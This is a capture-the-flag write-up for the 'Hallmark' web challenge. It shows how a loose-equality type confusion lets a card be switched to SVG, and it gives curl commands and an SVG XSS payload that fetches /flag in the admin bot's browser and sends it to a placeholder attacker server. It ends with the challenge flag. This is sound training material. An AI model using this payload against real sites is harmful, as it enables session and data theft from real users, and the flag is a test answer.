#### Challenge:

Send your loved ones a [Hallmark card](https://hallmark.web.actf.co/)! Maybe even send one to the [admin](https://admin-bot.actf.co/hallmark) 😳.

[Source code](./dist.tar.gz ":ignore")

---

#### Solution:

- inspecting the `index.js` reveals that we can alter already created cards via `PUT` request and change the `type` or `content`
- request handler also contains bug/typo with js `==` vs `===` that can be used for exploit as app is also using extended body parsing
  - `bodyParser.urlencoded({ extended: true })` allow us to pass arrays or objects via form params

- create the custom card with placeholder content
```bash
curl 'https://hallmark.web.actf.co/card' -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'svg=text' --data 'content=<h1>1</h1>'
```
- payload that will be used to leak the flag from within the admin browser
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400" />
    <script type="text/javascript">
        fetch("/flag").then(r=>r.text()).then(flag=>encodeURIComponent(flag)).then(e=>fetch(`https://myserver/${e}`)).then(console.log);
    </script>
</svg>
```
- alter the `content` and `type` of the previously created `card`
```bash
curl 'https://hallmark.web.actf.co/card' -X PUT \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data 'id=44f0d063-7f41-41e3-bdf6-a027b0c157fe' \
    --data 'type[]=image/svg+xml' \
    --data "content=${SVG}"
```

- now all that's left is submit the `https://hallmark.web.actf.co/card?id=44f0d063-7f41-41e3-bdf6-a027b0c157fe` in the `admin` portal and check the logs of our server...

---

<details><summary>FLAG:</summary>

```
actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}
```

</details>
<br/>
